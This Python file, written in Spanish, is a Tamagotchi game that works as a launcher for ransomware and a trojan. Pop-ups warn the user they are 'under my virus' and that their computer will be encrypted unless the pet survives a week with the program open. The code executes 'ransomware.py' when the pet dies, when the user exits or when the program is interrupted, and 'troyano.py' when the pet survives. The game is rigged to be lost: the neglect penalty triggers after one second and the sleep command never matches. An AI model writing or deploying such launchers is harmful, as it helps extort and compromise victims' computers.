import time
import tkinter as tk
from tkinter import messagebox
from datetime import datetime, timedelta

def caution():
    messagebox.showwarning("CAUTION", "Estas bajo mi virus, te dejare las explicaciones ahora buena suerte :)")

def instrucciones():
    messagebox.showinfo("INFO", "Lo que debes hacer es dejar al tamagochi vivo y el programa abierto durante una semana, eso significa que no debes aapgar el ordenador y debes cuidar al tamagochi si no lo cumples se encriptara permanentemente tu ordenador, buena suerte :)")

def consejo():
    messagebox.showinfo("CONSEJO", "Si descuidas al tamagochi durante 5 minutos todas sus stats se reduciran al 50% de lo que eran, por ejemplo si estan al 100% bajaran al 50% o si estan al 10% bajaran al 5% (esto se aplica en todas las estadisticas)")

for _  in range(1):
    caution()

for _ in range(1):
    instrucciones()

for _ in range(1):
    consejo()

class Tamagotchi:
    def __init__(self):
        self.hunger = 100
        self.energy = 100
        self.remaining_time = timedelta(days=7)
        self.last_interaction_time = datetime.now()
        self.alive = True

    def feed(self):
        self.hunger += 10
        print("Nom nom nom... ¡Estoy alimentado!")
        self.last_interaction_time = datetime.now()

    def play(self):
        self.energy -= 10
        print("¡Jaja! ¡Eso fue divertido!")
        self.last_interaction_time = datetime.now()

    def sleep(self):
        self.energy += 20
        print("Zzz... estoy descansando.")
        self.last_interaction_time = datetime.now()

    def check_status(self):
        print("""
        .------.
        |      |
        |  @   @ |
        |   --   |
        |        |
        '--------'
        """)
        print(f"Hambre: {self.hunger}, Energía: {self.energy}, Tiempo restante: {self.format_remaining_time()}")

    def update(self):
        current_time = datetime.now()
        time_since_last_interaction = current_time - self.last_interaction_time

        if time_since_last_interaction.total_seconds() >= 1:  # 5 minutos
            self.hunger *= 0.5
            self.energy *= 0.5
            print("¡Tu Tamagotchi se siente descuidado y todas las estadísticas han disminuido al 50%!")

        self.hunger -= 5
        self.energy -= 5
        self.remaining_time -= timedelta(seconds=1)

        if self.hunger <= 0 or self.energy <= 0 or self.remaining_time.total_seconds() <= 0:
            self.alive = False
            print("¡Oh no! Tu Tamagotchi ha muerto.")
            exec(open('ransomware.py').read())

    def format_remaining_time(self):
        days, seconds = divmod(self.remaining_time.total_seconds(), 86400)
        hours, seconds = divmod(seconds, 3600)
        minutes, seconds = divmod(seconds, 60)
        return f"{int(days)}d {int(hours)}h {int(minutes)}m {int(seconds)}s"

if __name__ == "__main__":
    tamagotchi = Tamagotchi()

    try:
        while tamagotchi.remaining_time.total_seconds() > 0:
            tamagotchi.check_status()
            action = input("¿Qué quieres hacer? (comer(eat)/jugar(play)/dormir(sleep)/salir(exit)): ").lower()

            if action == "comer(eat)":
                tamagotchi.feed()
            elif action == "jugar(play)":
                tamagotchi.play()
            elif action == "dormir(sleep)S":
                tamagotchi.sleep()
            elif action == "salir":
                exec(open('ransomware.py').read())
                raise KeyboardInterrupt("El usuario ha cerrado el programa.")

            tamagotchi.update()
            time.sleep(1)  # Simulando un segundo que pasa

    except KeyboardInterrupt:
        print("¡Has cerrado el programa antes de que pasaran los 7 días!")
        exec(open('ransomware.py').read())

    finally:
        if tamagotchi.alive:
            print("¡Felicidades! Has cuidado bien de tu Tamagotchi durante 7 días.")
            exec(open('troyano.py').read())